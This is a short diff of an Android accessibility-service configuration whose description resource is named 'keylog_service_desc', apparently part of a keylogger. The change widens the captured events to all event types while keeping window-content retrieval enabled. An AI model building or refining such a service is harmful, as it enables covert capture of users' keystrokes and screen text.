@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeViewFocused|typeViewTextSelectionChanged"
+    android:accessibilityEventTypes="typeAllMask"
     android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows"
+    android:accessibilityFlags="flagDefault"
     android:canRetrieveWindowContent="true"
-    android:notificationTimeout="100"
+    android:notificationTimeout="200"
     android:description="@string/keylog_service_desc"
     android:settingsActivity=".MainActivity" />
